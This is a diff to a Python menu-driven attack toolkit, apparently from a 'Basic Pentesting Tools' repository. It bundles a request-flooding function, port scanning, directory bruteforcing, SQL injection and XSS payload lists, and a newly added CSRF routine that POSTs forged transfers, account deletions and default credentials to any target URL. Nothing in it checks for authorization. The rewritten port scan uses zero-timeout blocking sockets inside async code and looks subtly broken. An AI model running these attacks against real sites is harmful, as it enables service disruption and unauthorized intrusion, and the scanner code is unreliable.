@@ -4,6 +4,9 @@ import socket
 import ssl
 from urllib.parse import urljoin, urlparse
 import os
+from concurrent.futures import ThreadPoolExecutor
+
+os.makedirs("output", exist_ok=True)
 
 def display_banner():
     print("""
@@ -13,7 +16,7 @@ def display_banner():
  ##  ##   ####     ## ##   ##   ##   ## ##    ####     #####   
  ##  ##   ##       ## ##   ##   ##   ## ##    ##       ## ##   
  ## ##    ##   #    ###    ### ###    ###     ##   #   ## ##   
-#####    #######    ###     #####     ###    #######  #### ##   V4.2
+#####    #######    ###     #####     ###    #######  #### ##   V4.3
 
  \033[1;32m+ -- -- +=[ Author: kdandy | Repo: https://github.com/kdandy/devtools\033[1;m
  \033[1;32m+ -- -- +=[ Basic Pentesting Tools \033[1;m
@@ -28,7 +31,9 @@ def display_menu():
     print("5. SQL Injection Testing")
     print("6. XSS Testing")
     print("7. Header and SSL/TLS Inspection")
-    choice = input("Enter options (1-7): ")
+    print("8. CSRF Testing")
+    print("9. Exit")
+    choice = input("Enter options (1-9): ")
     return choice
 
 def url_validator(url):
@@ -36,11 +41,12 @@ def url_validator(url):
     parsed = urlparse(url)
     return parsed.scheme in ('http', 'https')
 
-# Ensure output directory exists
-os.makedirs("output", exist_ok=True)
-
 async def fetch_subdomains(domain):
+    print("\nPress 'b' anytime to go back to the main menu.")
+    if domain.lower() == "b":
+        return
     crt_sh_url = f"https://crt.sh/?q=%25.{domain}&output=json"
+    print(f"Fetching subdomains for {domain}...")
     async with aiohttp.ClientSession() as session:
         try:
             async with session.get(crt_sh_url) as response:
@@ -58,9 +64,12 @@ async def fetch_subdomains(domain):
                 else:
                     print(f"Failed to access crt.sh. Status code: {response.status}")
         except Exception as e:
-            print(f"Error: {e}")
+            print(f"Error fetching subdomains: {e}")
 
 async def spam_get_requests(url, requests_per_batch):
+    print(f"Sending spam GET requests to {url} with {requests_per_batch} requests per batch.")
+    if url.lower() == "b" or str(requests_per_batch).lower() == "b":
+        return
     if not url_validator(url):
         print("Invalid URL. Please include http:// or https://")
         return
@@ -77,17 +86,24 @@ async def send_single_get_request(session, url):
     except Exception as e:
         print(f"Error accessing {url}: {e}")
 
-def full_port_scan(domain):
-    print("\nScanning all ports (1-65535)...")
+async def async_port_scan(ip, port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.settimeout(0)
+        try:
+            sock.connect((ip, port))
+            print(f"Port {port} is open on {ip}")
+            return port
+        except:
+            return None
+
+async def full_port_scan(domain):
+    print(f"Starting full port scan on {domain}")
+    if domain.lower() == "b":
+        return
     ip = socket.gethostbyname(domain)
     open_ports = []
-    for port in range(1, 65536):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(0.3)
-        if sock.connect_ex((ip, port)) == 0:
-            print(f"Port {port} is open on {domain}")
-            open_ports.append(port)
-        sock.close()
+    tasks = [async_port_scan(ip, port) for port in range(1, 65535)]
+    open_ports = [port for port in await asyncio.gather(*tasks) if port]
     
     if open_ports:
         with open("output/open_ports.txt", "w") as file:
@@ -97,6 +113,9 @@ def full_port_scan(domain):
         print("\nNo open ports found.")
 
 async def bruteforce_directories_and_sensitive_files(url):
+    print(f"Starting directory and file bruteforcing on {url}")
+    if url.lower() == "b":
+        return
     if not url_validator(url):
         print("Invalid URL. Please include http:// or https://")
         return
@@ -147,6 +166,9 @@ async def bruteforce_directories_and_sensitive_files(url):
             print("\nNo directories or files found.")
 
 async def sql_injection_testing(url):
+    print(f"Starting SQL injection testing on {url}")
+    if url.lower() == "b":
+        return
     if not url_validator(url):
         print("Invalid URL. Please include http:// or https://")
         return
@@ -189,6 +211,9 @@ async def sql_injection_testing(url):
                 print(f"Error testing SQL payload {payload}: {e}")
 
 async def xss_testing(url):
+    print(f"Starting XSS testing on {url}")
+    if url.lower() == "b":
+        return
     if not url_validator(url):
         print("Invalid URL. Please include http:// or https://")
         return
@@ -207,48 +232,28 @@ async def xss_testing(url):
     "<img src=x onerror=alert('XSS') />", "<img src=x onerror=\"alert('XSS')\" />",
     "<a href='javascript:alert(1)'>Click</a>", "<button onclick=alert('XSS')>Click</button>",
     "<div onmouseover=alert('XSS')>Hover over me!</div>", "<input onblur=alert('XSS')>",
-    
-    # Encoded XSS Payloads
     "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E", "<svg%20onload=alert('XSS')>",
     "<img%20src%3Dx%20onerror%3Dalert('XSS')>", "<iframe%20src=javascript:alert('XSS')>",
-    
-    # Attribute-Based Injection
     "<img src=x:alert(1) onerror=eval(src)>", "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
     "<body background=\"javascript:alert('XSS')\">", "<object data=\"javascript:alert('XSS')\">",
-    
-    # Advanced XSS Techniques
     "<details open ontoggle=alert('XSS')>XSS</details>", "<isindex action=javascript:alert('XSS')>",
     "<keygen autofocus onfocus=alert('XSS')>", "<marquee onstart=alert('XSS')>XSS</marquee>",
     "<object type=\"text/html\" data=\"javascript:alert('XSS')\"></object>",
-    
-    # JavaScript Scheme Injection
     "<a href='javascript:alert(1)'>XSS</a>", "<a href='JaVaScRiPt:alert(1)'>XSS</a>",
     "<iframe src=\"javascript:alert('XSS');\"></iframe>", "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
-    
-    # DOM-Based XSS
     "<script>document.write('<img src=x onerror=alert(1)>');</script>",
     "<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>",
     "<script>window.location='javascript:alert(1)';</script>", "<script>history.pushState('', '', 'javascript:alert(1)')</script>",
-    
-    # HTML Injection for Stored XSS
     "<div><iframe src=javascript:alert('XSS')></iframe></div>", "<table background=javascript:alert('XSS')>",
     "<img dynsrc=javascript:alert('XSS')>", "<style>*{background:url('javascript:alert(1)')}</style>",
     "<img src=1 href=1 dynsrc=javascript:alert(1)>",
-
-    # XSS in SVG and XML
     "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
     "<math><mtext></mtext><script>alert('XSS')</script></math>",
     "<xml><script><![CDATA[alert('XSS')]]></script></xml>",
-    
-    # CSS-Based XSS
     "<style>@import 'javascript:alert(1)';</style>", "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
     "<style>img[src=\"x\"]{background:url(\"javascript:alert('XSS')\")}</style>",
-    
-    # Obfuscated XSS Payloads
     "<scr<script>ipt>alert('XSS')</scr<script>ipt>", "<scr<script>ipt>alert(1)//<scr<script>ipt>",
     "<sCrIpt>alert('XSS')</sCrIpt>", "<svg><sCrIpt>alert('XSS')</sCrIpt></svg>",
-    
-    # JSON and JavaScript Context XSS
     "{\"data\":\"<img src=x onerror=alert(1)>\"}", "<script>const x=\"<img src=x onerror=alert(1)>\";</script>"
     ]
     
@@ -265,6 +270,9 @@ async def xss_testing(url):
                 print(f"Error testing XSS payload {payload}: {e}")
 
 async def inspect_headers_and_ssl(domain):
+    print(f"Starting header and SSL/TLS inspection on {domain}")
+    if domain.lower() == "b":
+        return
     async with aiohttp.ClientSession() as session:
         try:
             async with session.get(f"https://{domain}") as response:
@@ -282,34 +290,85 @@ async def inspect_headers_and_ssl(domain):
             for key, value in cert.items():
                 print(f"{key}: {value}")
 
+async def csrf_testing(url):
+    print(f"Starting CSRF testing on {url}")
+    if url.lower() == "b":
+        return
+
+    csrf_payloads = [
+        {"username": "csrf_test", "password": "csrf_test"},
+        {"user": "admin", "pass": "password123"},
+        {"username": "admin", "password": "password", "csrf_token": ""},
+        {"email": "test@example.com", "password": "12345", "remember": "1"},
+        {"user_id": "1", "amount": "1000", "transfer": "send"},
+        {"username": "root", "password": "toor"},
+        {"username": "administrator", "password": "admin1234"},
+        {"name": "csrf_attempt", "token": ""},
+        {"account": "guest", "login": "true", "csrf": "null"},
+        {"username": "user", "session": "abc123", "auth_token": ""},
+        {"user_email": "user@example.com", "confirm": "yes", "csrf_token": ""},
+        {"userid": "admin", "otp": "0000"},
+        {"action": "delete_account", "confirm": "1", "csrf_token": ""},
+        {"transfer_to": "2", "amount": "5000", "auth": ""},
+        {"username": "superuser", "password": "supersecure", "remember_me": "1"},
+        {"login": "yes", "auth_token": "12345abc", "user_id": "99"},
+        {"reset_password": "true", "email": "reset@example.com", "csrf": ""},
+        {"username": "testuser", "old_password": "oldpass", "new_password": "newpass", "csrf_token": ""},
+        {"action": "disable_account", "confirm": "yes", "token": ""},
+        {"login_as": "guest", "temporary_access": "true"},
+        {"email": "csrf_user@example.com", "request_code": "true", "csrf_protection": ""},
+        {"modify": "settings", "privacy": "off", "auth_key": ""},
+        {"account_id": "123", "debit": "100", "submit": "confirm"},
+        {"service": "premium", "activate": "yes", "csrf_token": ""},
+    ]
+
+
+    
+    async with aiohttp.ClientSession() as session:
+        for payload in csrf_payloads:
+            try:
+                async with session.post(url, data=payload) as response:
+                    print(f"CSRF payload {payload} on {url} status {response.status}")
+            except Exception as e:
+                print(f"Error testing CSRF payload {payload}: {e}")
+
 async def main():
     display_banner()
-    choice = display_menu()
+    while True:
+        choice = display_menu()
 
-    if choice == "1":
-        domain = input("Enter the target domain (e.g., example.com): ")
-        await fetch_subdomains(domain)
-    elif choice == "2":
-        url = input("Enter target URL: ")
-        requests_per_batch = int(input("Enter the number of requests per batch: "))
-        await spam_get_requests(url, requests_per_batch)
-    elif choice == "3":
-        domain = input("Enter the target domain for port scan (e.g., example.com): ")
-        full_port_scan(domain)
-    elif choice == "4":
-        url = input("Enter the target URL for directory and sensitive file bruteforcing (e.g., https://example.com/): ")
-        await bruteforce_directories_and_sensitive_files(url)
-    elif choice == "5":
-        url = input("Enter the target URL for SQL Injection testing (e.g., https://example.com/search?q=): ")
-        await sql_injection_testing(url)
-    elif choice == "6":
-        url = input("Enter the target URL for XSS testing (e.g., https://example.com): ")
-        await xss_testing(url)
-    elif choice == "7":
-        domain = input("Enter the target domain for header and SSL/TLS inspection (e.g., example.com): ")
-        await inspect_headers_and_ssl(domain)
-    else:
-        print("Invalid selection.")
+        if choice == "1":
+            domain = input("Enter the target domain (e.g., example.com): ")
+            await fetch_subdomains(domain)
+        elif choice == "2":
+            url = input("Enter target URL: ")
+            requests_per_batch = input("Enter the number of requests per batch: ")
+            if requests_per_batch.lower() == "b":
+                continue
+            await spam_get_requests(url, int(requests_per_batch))
+        elif choice == "3":
+            domain = input("Enter the target domain for port scan (e.g., example.com): ")
+            await full_port_scan(domain)
+        elif choice == "4":
+            url = input("Enter the target URL for directory and sensitive file bruteforcing (e.g., https://example.com/): ")
+            await bruteforce_directories_and_sensitive_files(url)
+        elif choice == "5":
+            url = input("Enter the target URL for SQL Injection testing (e.g., https://example.com/search?q=): ")
+            await sql_injection_testing(url)
+        elif choice == "6":
+            url = input("Enter the target URL for XSS testing (e.g., https://example.com): ")
+            await xss_testing(url)
+        elif choice == "7":
+            domain = input("Enter the target domain for header and SSL/TLS inspection (e.g., example.com): ")
+            await inspect_headers_and_ssl(domain)
+        elif choice == "8":
+            url = input("Enter the target URL for CSRF testing (e.g., https://example.com/login): ")
+            await csrf_testing(url)
+        elif choice == "9":
+            print("Exiting...")
+            break
+        else:
+            print("Invalid selection. Please choose a valid option.")
 
 try:
     asyncio.run(main())
